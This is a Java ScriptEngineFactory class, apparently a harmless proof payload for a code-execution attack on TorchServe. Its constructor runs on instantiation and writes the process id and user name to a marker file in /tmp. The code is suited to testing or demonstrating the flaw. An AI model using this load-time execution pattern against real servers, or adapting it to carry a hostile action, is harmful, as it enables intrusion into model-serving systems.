import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;
import javax.script.*;

/** Benign counterpart of the existing ScriptEngineFactory payload constructor. */
public final class NativeScriptEngineFactory implements ScriptEngineFactory {
    public NativeScriptEngineFactory() throws Exception {
        String value = "torchserve-native:" + ProcessHandle.current().pid() + ":" + System.getProperty("user.name") + "\n";
        Files.write(Paths.get("/tmp/module-target-torchserve-native-proof"), value.getBytes(StandardCharsets.UTF_8), StandardOpenOption.CREATE, StandardOpenOption.APPEND);
    }
    public String getEngineName() { return "module-target-native"; }
    public String getEngineVersion() { return "1"; }
    public List<String> getExtensions() { return Collections.emptyList(); }
    public List<String> getMimeTypes() { return Collections.emptyList(); }
    public List<String> getNames() { return Collections.singletonList("module-target-native"); }
    public String getLanguageName() { return "module-target-native"; }
    public String getLanguageVersion() { return "1"; }
    public Object getParameter(String key) { return null; }
    public String getMethodCallSyntax(String object, String method, String... args) { return null; }
    public String getOutputStatement(String value) { return null; }
    public String getProgram(String... statements) { return null; }
    public ScriptEngine getScriptEngine() { return null; }
}
